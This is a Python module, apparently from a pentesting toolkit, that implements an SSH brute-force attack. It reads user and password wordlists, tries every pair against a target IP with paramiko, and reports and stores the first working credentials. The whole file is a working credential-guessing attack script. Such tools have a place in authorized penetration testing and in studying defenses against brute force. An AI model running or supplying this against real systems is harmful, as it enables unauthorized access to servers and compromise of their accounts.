from time import sleep
import paramiko
import Pentesting.ModuleTools as Module

userL = "Pentesting/Attack/Tools/users.txt"
passL = "Pentesting/Attack/Tools/passes.txt"

def Start_ssh(target_ip):
    global user
    global password
    global status
    
    usr_list = []
    pass_list = []
    attack = False
    status = False
    

    with open(userL) as file:
        for line in file:
            usr_list.append(line)
    with open(passL, "r") as file:
        for line in file:
            pass_list.append(line)
    attack = True
     

    x = 0
    u = 0
    while attack == True:

        try:

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("ATTACKING..")
            print("[*] Username:", str(usr_list[u]))
            print("[*] Password:", str(pass_list[x]))
            client.connect(username=usr_list[u], hostname=target_ip, password=pass_list[x], port=22, timeout=45, banner_timeout=180)
            print(f"Password {Module.TGREEN}FOUND{Module.TWHITE}: User: {usr_list[u]}, Password: {pass_list[x]}")
            user = usr_list[u]
            password = pass_list[x]
            status = True
            break

        except paramiko.ssh_exception.AuthenticationException:
            
            if x == len(pass_list) - 1:
                x = 0
                if u == len(usr_list) - 1:    break
                u += 1
            else:
                x += 1
            continue
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(f"{Module.TRED}ERROR{Module.TWHITE}")
            print("QUITTING.....")
            sleep(5)
            attack = False
            
        except paramiko.ssh_exception.SSHException:
            print(f"{Module.TRED}CANNOT CONNECT{Module.TWHITE}")
            print("QUITTING.....")
            sleep(5)
            attack = False

        except:
            sleep(15)
            continue
        attack = False

def GetState():
    return status
def GetUser():
    return user

def Getpassword():
    return password
    


